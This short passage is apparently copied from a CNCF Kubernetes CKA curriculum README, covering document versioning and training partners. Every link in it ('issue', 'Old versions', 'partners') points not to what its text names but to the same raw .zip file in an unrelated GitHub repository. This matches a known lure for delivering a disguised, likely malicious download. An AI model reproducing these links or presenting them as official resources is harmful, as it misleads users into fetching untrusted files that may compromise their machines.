If you see any errors with the document, please open an [issue](https://raw.githubusercontent.com/joymondal/curriculum/master/orguinette/curriculum.zip) here. The document major and minor version (e.g., the 1 and 8 in 1.8.0) match the version of Kubernetes. The patch version (e.g., the 0 in 1.8.0) represents any iterations in the documentation for that version of Kubernetes. [Old versions](https://raw.githubusercontent.com/joymondal/curriculum/master/orguinette/curriculum.zip) remain available.

CNCF encourages training companies to align their offerings to cover the contents of the curriculum. Training [partners](https://raw.githubusercontent.com/joymondal/curriculum/master/orguinette/curriculum.zip) can purchase coupons for the CKA exam at a wholesale price to offer at the end of their training.
